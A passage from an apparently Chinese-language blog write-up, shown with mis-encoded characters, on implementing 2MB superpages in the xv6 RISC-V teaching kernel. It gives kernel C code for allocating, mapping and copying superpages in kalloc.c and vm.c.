è¿‡æ—©åœ°è€—å°½ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/kalloc.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">freelist</span>;</span></span><br><span class="line">&#125; kmem_super;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kinit</span><span class="params">()</span>&#123;</span><br><span class="line">  initlock(&amp;kmem.lock, <span class="string">&quot;kmem&quot;</span>);</span><br><span class="line">  initlock(&amp;kmem_super.lock, <span class="string">&quot;kmem_super&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> superpages = <span class="number">0</span>;</span><br><span class="line">  <span class="type">char</span> *p;</span><br><span class="line">  p = (<span class="type">char</span>*)PGROUNDUP((uint64)end);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>( ; p + PGSIZE &lt;= (<span class="type">char</span>*)PHYSTOP; )&#123;</span><br><span class="line">    <span class="keyword">if</span>(((uint64)p % SUPERPGSIZE) == <span class="number">0</span> &amp;&amp; superpages &lt; MAX_SUPERPAGES</span><br><span class="line">       &amp;&amp; p + SUPERPGSIZE &lt;= (<span class="type">char</span>*)PHYSTOP)&#123;</span><br><span class="line">      <span class="comment">// éœ€è¦ç»§ç»­æ·»åŠ 2MBçš„å†…å­˜å—åˆ°kmem_super.freelistä¸­</span></span><br><span class="line">      superfree(p);</span><br><span class="line">      superpages++;</span><br><span class="line">      p += SUPERPGSIZE;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="comment">// æ»¡è¶³ä»¥ä¸‹æ¡ä»¶åˆ™å°†å†…å­˜åˆ’å…¥kmem.freelistä¸­ï¼š</span></span><br><span class="line">      <span class="comment">//  1. å·²ç»æœ‰äº†è¶³å¤Ÿçš„å¤§é¡µï¼ˆ4ä¸ªsuperpageï¼‰</span></span><br><span class="line">      <span class="comment">//  2. åœ°å€ä¸å¯¹é½2MB</span></span><br><span class="line">      <span class="comment">//  3. å‰©ä½™å†…å­˜å°äº2MB</span></span><br><span class="line">      kfree(p);</span><br><span class="line">      p += PGSIZE;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯¹åº” kfree å’Œ kalloc å®ç°superç‰ˆæœ¬</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">superfree</span><span class="params">(<span class="type">void</span> *pa)</span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(((uint64)pa % SUPERPGSIZE) != <span class="number">0</span> || (<span class="type">char</span>*)pa &lt; end || (uint64)pa &gt;= PHYSTOP)</span><br><span class="line">    panic(<span class="string">&quot;superfree&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(pa, <span class="number">1</span>, SUPERPGSIZE);</span><br><span class="line"></span><br><span class="line">  r = (<span class="keyword">struct</span> run*)pa;</span><br><span class="line"></span><br><span class="line">  acquire(&amp;kmem_super.lock);</span><br><span class="line">  r-&gt;next = kmem_super.freelist;</span><br><span class="line">  kmem_super.freelist = r;</span><br><span class="line">  release(&amp;kmem_super.lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">superalloc</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">  acquire(&amp;kmem_super.lock);</span><br><span class="line">  r = kmem_super.freelist;</span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    kmem_super.freelist = r-&gt;next;</span><br><span class="line">  release(&amp;kmem_super.lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    <span class="built_in">memset</span>((<span class="type">char</span>*)r, <span class="number">5</span>, SUPERPGSIZE); <span class="comment">// fill with junk</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span>*)r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶åœ¨è°ƒç”¨å®Œ <code>kinit()</code> åï¼Œæˆ‘ä»¬æœ‰ <code>kmem.freelist</code> æ¥ä¿å­˜ 4KB çš„ç©ºé—²ç‰©ç†é¡µï¼ŒåŒæ—¶ä¹Ÿæœ‰ <code>kmem_super.freelist</code> æ¥ä¿å­˜ 2MB çš„ç©ºé—² superpage ï¼Œä»è€Œå®ç°äº†å¯¹ç‰©ç†å†…å­˜çš„åˆ’åˆ†ç®¡ç†ã€‚</p><h2 id="2-è™šæ‹Ÿå†…å­˜å¤§é¡µæ˜ å°„"><a class="markdownIt-Anchor" href="#2-è™šæ‹Ÿå†…å­˜å¤§é¡µæ˜ å°„"></a> 2. è™šæ‹Ÿå†…å­˜å¤§é¡µæ˜ å°„</h2><blockquote><p>The operating system creates a superpage by <strong>setting the PTE_V and PTE_R bits in the level-1 PTE</strong>, and setting the physical page number to point to the start of a two-megabyte region of physical memory.</p></blockquote><p>ç°åœ¨æˆ‘ä»¬æœ‰äº†ç‰©ç† superpage ï¼Œä¸‹ä¸€æ­¥æ˜¯åœ¨ç”¨æˆ·è¯·æ±‚å†…å­˜ï¼ˆ<code>malloc</code> æˆ– <code>sbrk</code>ï¼‰æ—¶ï¼Œå¯ä»¥æ­£ç¡®åœ°ä½¿ç”¨å®ƒä»¬æ¥åˆ›å»ºé¡µè¡¨æ˜ å°„ã€‚æ ¹æ® RISC-V è§„èŒƒï¼Œé¡µè¡¨æ˜ å°„çš„æ–¹æ³•æ˜¯è®¾ç½® L1 é¡µè¡¨é¡¹çš„æœ‰æ•ˆä½ PTE_V å’Œå¯è¯»ä½ PTE_Rï¼Œä»è€Œä½¿å…¶ PPN ä»£è¡¨çš„æ˜¯ 2MB å¤§å°ç‰©ç†å—çš„èµ·å§‹ç‰©ç†åœ°å€ï¼Œè€Œéä¸‹ä¸€çº§é¡µè¡¨é¡µçš„åœ°å€ï¼ˆå¶èŠ‚ç‚¹ï¼‰ã€‚</p><p>åœ¨åŸæœ¬çš„ <code>uvmalloc()</code> çš„åˆ¤æ–­é€»è¾‘ä¹‹ä¸Šï¼Œæˆ‘ä»¬éœ€è¦æ·»åŠ  superpage çš„åˆ†é…é€»è¾‘ï¼Œå³ç”³è¯·çš„å†…å­˜å¤§äº 2MB ä¸” è™šæ‹Ÿåœ°å€ <code>a</code> ä»¥ 2MB å¯¹é½ï¼Œæˆ‘ä»¬å°†ç›´æ¥åˆ†é…ä¸€ä¸ª superpage ï¼Œè€Œéåˆ†é… 512 ä¸ª 4KB çš„å°é¡µï¼Œç„¶åæ˜ å°„åˆ°è¿›ç¨‹çš„ L1 é¡µè¡¨ä¸Šã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/vm.c</span></span><br><span class="line">uint64 <span class="title function_">uvmalloc</span><span class="params">(<span class="type">pagetable_t</span> pagetable, uint64 oldsz, uint64 newsz, <span class="type">int</span> xperm)</span>&#123;</span><br><span class="line">  <span class="type">char</span> *mem;</span><br><span class="line">  uint64 a;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(newsz &lt; oldsz)</span><br><span class="line">    <span class="keyword">return</span> oldsz;</span><br><span class="line"></span><br><span class="line">  oldsz = PGROUNDUP(oldsz);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(a = oldsz ; a &lt; newsz; )&#123;</span><br><span class="line">    <span class="keyword">if</span>(a % SUPERPGSIZE == <span class="number">0</span> &amp;&amp; newsz - a &gt; SUPERPGSIZE)&#123;</span><br><span class="line">      <span class="comment">// è™šæ‹Ÿåœ°å€va 2MBå¯¹é½ï¼Œå¯ä»¥ç›´æ¥åˆ†é…superpage</span></span><br><span class="line">      mem = superalloc();</span><br><span class="line">      <span class="keyword">if</span>(mem == <span class="number">0</span>)&#123;</span><br><span class="line">        uvmdealloc(pagetable, a, oldsz);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">memset</span>(mem, <span class="number">0</span>, SUPERPGSIZE);</span><br><span class="line">      <span class="comment">// å°†ç”³è¯·çš„ç‰©ç†superpageæ˜ å°„åˆ°L1é¡µè¡¨é¡¹ä¸Š</span></span><br><span class="line">      <span class="keyword">if</span>(mapsuperpages(pagetable, a, SUPERPGSIZE, (uint64)mem, PTE_R|PTE_U|xperm) != <span class="number">0</span>)&#123;</span><br><span class="line">        superfree(mem);</span><br><span class="line">        uvmdealloc(pagetable, a, oldsz);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      a += SUPERPGSIZE;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="comment">// va is not aligned or no need to use superpage</span></span><br><span class="line">      mem = kalloc();</span><br><span class="line">      <span class="keyword">if</span>(mem == <span class="number">0</span>)&#123;</span><br><span class="line">        uvmdealloc(pagetable, a, oldsz);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">memset</span>(mem, <span class="number">0</span>, PGSIZE);</span><br><span class="line">      <span class="keyword">if</span>(mappages(pagetable, a, PGSIZE, (uint64)mem, PTE_R|PTE_U|xperm) != <span class="number">0</span>)&#123;</span><br><span class="line">        kfree(mem);</span><br><span class="line">        uvmdealloc(pagetable, a, oldsz);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      a += PGSIZE;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> newsz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ˜ å°„å¤§é¡µæ—¶ä¸èƒ½ä½¿ç”¨åŸæœ¬çš„ <code>mappages</code> ï¼Œå› ä¸ºè¿™ä¸ªåªé€‚åˆ 4KB çš„å°é¡µã€‚æˆ‘ä»¬éœ€è¦è‡ªå·±è®¾è®¡ä¸€ä¸ªç›¸ä¼¼çš„ <code>mapsuperpages</code> ï¼ŒåŒæ—¶ <code>walk</code> ä¹Ÿä¸èƒ½ç›´æ¥ç”¨ï¼Œå› ä¸º <code>walk</code> ä¼šèµ°åˆ° L0 çš„ PTEã€‚æˆ‘ä¸€å¼€å§‹æ²¡æœ‰é€‰æ‹©å†™ä¸€ä¸ªèµ°åˆ° L1 çš„ <code>walk</code> ï¼Œè€Œæ˜¯ç›´æ¥åœ¨ Â <code>mapsuperpages</code>Â  ä¸­å†…è” Â <code>walk</code>Â  çš„é€»è¾‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/vm.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">mapsuperpages</span><span class="params">(<span class="type">pagetable_t</span> pagetable, uint64 va, uint64 size, uint64 pa, <span class="type">int</span> perm)</span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">    <span class="comment">// æ‰¾åˆ°è™šæ‹Ÿåœ°å€aå¯¹åº”çš„L1é¡µè¡¨é¡¹</span></span><br><span class="line">    <span class="type">pagetable_t</span> l1_table;</span><br><span class="line">    pte = &amp;pagetable[PX(<span class="number">2</span>, a)];</span><br><span class="line">    <span class="keyword">if</span>(*pte &amp; PTE_V) &#123;</span><br><span class="line">      l1_table = (<span class="type">pagetable_t</span>)PTE2PA(*pte);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span>((l1_table = (<span class="type">pde_t</span>*)kalloc()) == <span class="number">0</span>)</span><br><span class="line">        <span class="comment">// æ²¡æœ‰è¶³å¤Ÿçš„å†…å­˜å»åˆ†é…ä¸€ä¸ª L1 é¡µè¡¨é¡µ</span></span><br><span class="line">        <span class="comment">// *è¿™é‡Œåº”è¯¥éœ€è¦æœ‰é”™è¯¯å›æ»šæ“ä½œï¼Œä½†mappagesæ²¡æœ‰æˆ‘ä¹Ÿå°±æ²¡å†™</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      <span class="built_in">memset</span>(l1_table, <span class="number">0</span>, PGSIZE);</span><br><span class="line">      *pte = PA2PTE(l1_table) | PTE_V;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pte = &amp;l1_table[PX(<span class="number">1</span>, a)];</span><br><span class="line">    <span class="keyword">if</span>(*pte &amp; PTE_V)</span><br><span class="line">      panic(<span class="string">&quot;mapsuperpages: remap&quot;</span>);</span><br><span class="line"></span><br><span class="line">    *pte = PA2PTE(pa) | perm | PTE_V; <span class="comment">// æ„é€ æ˜ å°„</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†åé¢å¤åˆ¶å’Œé‡Šæ”¾é¡µè¡¨é¡¹æ—¶ä¹Ÿéœ€è¦åˆ¤æ–­ L1 é¡µè¡¨é¡¹æ˜¯å¦ä¸º superpageï¼Œä¸ºäº†ç®€åŒ–é€»è¾‘ä»¥åŠå‡å°‘é‡å¤ä»£ç ï¼Œæœ€ç»ˆæ„é€ äº†ä¸€ä¸ª <code>walk_l1</code> å‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/vm.c</span></span><br><span class="line"><span class="type">pte_t</span> * <span class="title function_">walk_l1</span><span class="params">(<span class="type">pagetable_t</span> pagetable, uint64 va, <span class="type">int</span> alloc)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(va &gt;= MAXVA)</span><br><span class="line">    panic(<span class="string">&quot;walk_l1: va beyond MAXVA&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">pte_t</span> *pte = &amp;pagetable[PX(<span class="number">2</span>, va)];</span><br><span class="line">  <span class="keyword">if</span>(*pte &amp; PTE_V) &#123;</span><br><span class="line">    pagetable = (<span class="type">pagetable_t</span>)PTE2PA(*pte);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!alloc || (pagetable = (<span class="type">pde_t</span>*)kalloc()) == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;   <span class="comment">// invalid access or no more free memory to alloc</span></span><br><span class="line">    <span class="built_in">memset</span>(pagetable, <span class="number">0</span>, PGSIZE);</span><br><span class="line">    *pte = PA2PTE(pagetable) | PTE_V;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> &amp;pagetable[PX(<span class="number">1</span>, va)];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨æ­¤ä¹‹ä¸Š <code>mapsuperpages</code> çš„é€»è¾‘å’Œ <code>mappages</code> åŸºæœ¬ä¸€æ ·ã€‚</p><p>è¿™æ ·æˆ‘ä»¬å°±å®Œæˆäº†è™šæ‹Ÿå¤§é¡µçš„æ˜ å°„é€»è¾‘ï¼Œä½†æ˜¯åœ¨ <code>uvmalloc</code> å¯¹åº”çš„ <code>uvmdealloc</code> å¹¶æ²¡æœ‰å¯¹åº”åœ°ä¿®æ”¹ï¼Œå› æ­¤å®ƒè¿˜æ— æ³•æ­£å¸¸è¿è¡Œã€‚ <code>uvmdalloc</code> çš„ä¿®æ”¹ä¾èµ–äº <code>uvmunmap</code> çš„ superpage æ”¯æŒï¼Œä»¥ä¸Šæˆ‘ä»¬åªå®ç°äº† <code>mappages</code> ä»¥åŠ <code>mapsuperpages</code> ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ....</span></span><br><span class="line">  <span class="keyword">if</span>(mapsuperpages(pagetable, a, SUPERPGSIZE, (uint64)mem, PTE_R|PTE_U|xperm) != <span class="number">0</span>)&#123;</span><br><span class="line">superfree(mem);</span><br><span class="line">uvmdealloc(pagetable, a, oldsz);  <span class="comment">// uvmdealloc æ²¡æœ‰å®Œå–„</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// ....</span></span><br></pre></td></tr></table></figure><h2 id="3-è¿›ç¨‹ç”Ÿå‘½å‘¨æœŸç®¡ç†"><a class="markdownIt-Anchor" href="#3-è¿›ç¨‹ç”Ÿå‘½å‘¨æœŸç®¡ç†"></a> 3. è¿›ç¨‹ç”Ÿå‘½å‘¨æœŸç®¡ç†</h2><p>ç°åœ¨è¿›ç¨‹åœ°å€ç©ºé—´é‡Œå¯èƒ½æ··åˆäº† 4KB å°é¡µå’Œ 2MB å¤§é¡µã€‚å½“è¿›ç¨‹ Â <code>fork</code>Â  æˆ– Â <code>exit</code>Â  æ—¶ï¼Œæˆ‘ä»¬éœ€è¦æ­£ç¡®åœ°å¤„ç†è¿™ä¸¤ç§æƒ…å†µã€‚</p><h3 id="31-ä¿®æ”¹-uvmcopy"><a class="markdownIt-Anchor" href="#31-ä¿®æ”¹-uvmcopy"></a> 3.1 ä¿®æ”¹ uvmcopy()</h3><p>å½“ <code>fork</code>Â  åˆ›å»ºå­è¿›ç¨‹æ—¶ï¼Œå­è¿›ç¨‹å¤åˆ¶çˆ¶è¿›ç¨‹çš„åœ°å€ç©ºé—´ï¼Œå› æ­¤ä¼šå¾—åˆ°å’Œçˆ¶è¿›ç¨‹ä¸€æ ·çš„é¡µè¡¨ï¼ŒåŒºåˆ«åœ¨äºæ˜ å°„ç‰©ç†é¡µæ˜¯ä¸åŒçš„ã€‚æ ‡å‡†çš„ Â <code>uvmcopy</code>Â  æ˜¯é€ä¸ª 4KB é¡µé¢ï¼ˆè™šæ‹Ÿåœ°å€ï¼‰éå†çˆ¶è¿›ç¨‹çš„é¡µè¡¨è¿›è¡Œå¤åˆ¶çš„ã€‚å½“å®ƒé‡åˆ°ä¸€ä¸ªå¤§é¡µæ˜ å°„æ—¶ï¼ŒÂ uvmcopyÂ  éœ€è¦èƒ½<strong>è¯†åˆ«å‡º L1 PTE æ˜¯ä¸€ä¸ªå¤§é¡µå¶å­èŠ‚ç‚¹</strong>ã€‚</p><p>å½“è¯†åˆ«å‡ºå¤§é¡µåï¼Œ(1) è°ƒç”¨ Â <code>superalloc()</code>Â  ä¸ºå­è¿›ç¨‹åˆ†é…ä¸€ä¸ªæ–°çš„ 2MB ç‰©ç†å—ï¼Œ(2) å°†çˆ¶è¿›ç¨‹çš„ 2MB ç‰©ç†å—çš„<strong>å†…å®¹</strong>å®Œæ•´åœ°å¤åˆ¶åˆ°å­è¿›ç¨‹æ–°çš„ 2MB ç‰©ç†å—ä¸­ (<code>memmove</code>)ï¼Œ(3) æœ€ååœ¨å­è¿›ç¨‹çš„é¡µè¡¨ä¸­ï¼ŒåŒæ ·åœ°æ‰‹åŠ¨åˆ›å»ºä¸€ä¸ª L1 å¤§é¡µ PTEï¼ŒæŒ‡å‘è¿™ä¸ªæ–°çš„ 2MB ç‰©ç†å—ã€‚</p><p><strong>ç°åœ¨çš„å…³é”®é—®é¢˜å¯ä»¥ç®€åŒ–ä¸ºï¼šåœ¨äºç»™å®šä¸€ä¸ªæ ¹é¡µè¡¨ï¼ˆæ·±åº¦ä¸º 3 çš„ B æ ‘ï¼‰ï¼Œæˆ‘ä»¬è¦æ‰¾åˆ°æ‰€æœ‰çš„å¶èŠ‚ç‚¹ï¼ŒåŒæ—¶è¦çŸ¥é“è¿™ä¸ªå¶èŠ‚ç‚¹æ˜¯åœ¨ L1 è¿˜æ˜¯ L0 é¡µè¡¨ä¸­ã€‚</strong></p><p>å…¶ä¸­çš„æ ¸å¿ƒæ€æƒ³æ˜¯åœ¨ä¸€ä¸ªä» Â 0Â  åˆ° Â szÂ  çš„å¾ªç¯ä¸­ï¼Œåœ¨æ¯ä¸€æ­¥éƒ½<strong>ä¼˜å…ˆæ£€æŸ¥å½“å‰åœ°å€æ˜¯å¦è¢«ä¸€ä¸ªå¤§é¡µè¦†ç›–</strong>ã€‚</p><ul><li>å¦‚æœæ˜¯ï¼Œå°±ä¸€æ¬¡æ€§å¤åˆ¶å’Œæ˜ å°„æ•´ä¸ª 2MB çš„å¤§é¡µï¼Œç„¶åå°†å¾ªç¯å˜é‡ Â <code>i</code>Â  å‘å‰æ¨è¿› 2MBã€‚</li><li>å¦‚æœä¸æ˜¯ï¼Œå°±å›é€€åˆ°å¤„ç† 4KB å°é¡µçš„è€æ–¹æ³•ï¼Œå¹¶å°†å¾ªç¯å˜é‡ Â <code>i</code>Â  å‘å‰æ¨è¿› 4KBã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/vm.c</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">uvmcopy</span><span class="params">(<span class="type">pagetable_t</span> old, <span class="type">pagetable_t</span> new, uint64 sz)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">pte_t</span> *pte;</span><br><span class="line">  uint64 pa, i;</span><br><span class="line">  uint flags;</span><br><span class="line">  <span class="type">char</span> *mem;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; sz;)&#123;</span><br><span class="line">    <span class="comment">// å¯¹äºç”¨æˆ·è™šæ‹Ÿåœ°å€iï¼Œæ‰«ææ­¥é•¿ä¸ºPGSIZEæˆ–SUPERPGSIZEï¼Œå‡å¯ä¿è¯4KBå¯¹é½</span></span><br><span class="line">    pte = walk_l1(old, i, <span class="number">0</span>);   <span class="comment">// é¦–å…ˆå‡è®¾åœ°å€iæ˜ å°„äº†çš„æ˜¯superpage</span></span><br><span class="line">    <span class="keyword">if</span>(pte == <span class="number">0</span>)</span><br><span class="line">      panic(<span class="string">&quot;uvmcopy: pte should exist&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((*pte &amp; PTE_V) &amp;&amp; (*pte &amp; (PTE_R|PTE_W|PTE_X)))&#123;</span><br><span class="line">      <span class="comment">// åœ°å€iç¡®å®ä½äºæ˜ å°„äº†superpage</span></span><br><span class="line">      pa = PTE2PA(*pte);</span><br><span class="line">      flags = PTE_FLAGS(*pte);</span><br><span class="line">      <span class="keyword">if</span>((mem = superalloc()) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> err; <span class="comment">// TODOé”™è¯¯å¤„ç†</span></span><br><span class="line">      memmove(mem, (<span class="type">char</span>*)pa, SUPERPGSIZE);</span><br><span class="line">      uint64 aligned_va = SUPERPGROUNDDOWN(i);</span><br><span class="line">      <span class="keyword">if</span>(mapsuperpages(new, aligned_va, SUPERPGSIZE, (uint64)mem, flags) != <span class="number">0</span>)&#123;</span><br><span class="line">        superfree(mem);</span><br><span class="line">        <span class="keyword">goto</span> err; <span class="comment">// TODOé”™è¯¯å¤„ç†</span></span><br><span class="line">      &#125;</span><br><span class="line">      i = aligned_va + SUPERPGSIZE;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="comment">// åœ°å€iæ˜ å°„çš„æ˜¯4KBå°é¡µ</span></span><br><span class="line">      <span class="keyword">if</span>((pte = walk(old, i, <span class="number">0</span>)) == <span class="number">0</span>)</span><br><span class="line">        panic(<span class="string">&quot;uvmcopy: pte should exist&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span>((*pte &amp; PTE_V) == <span class="number">0</span>)</span><br><span class="line">        panic(<span class="string">&quot;uvmcopy: page not present&quot;</span>);</span><br><span class="line">      pa = PTE2PA(*pte);</span><br><span class="line">      flags = PTE_FLAGS(*pte);</span><br><span class="line">      <span class="keyword">if</span>((mem = kalloc()) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> err;</span><br><span class="line">      memmove(mem, (<span class="type">char</span>*)pa, PGSIZE);</span><br><span class="line">      <span class="keyword">if</span>(mappages(new, i, PGSIZE, (uint64)mem, flags) != <span class="number">0</span>)&#123;</span><br><span class="line">        kfree(mem);</span><br><span class="line">        <span class="keyword">goto</span> err;</span><br><span class="line">      &#125;</span><br><span class="line">      i += PGSIZE;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> err:</span><br><span class="line">  <span class="comment">// è¿™é‡Œçš„ uvmunmap 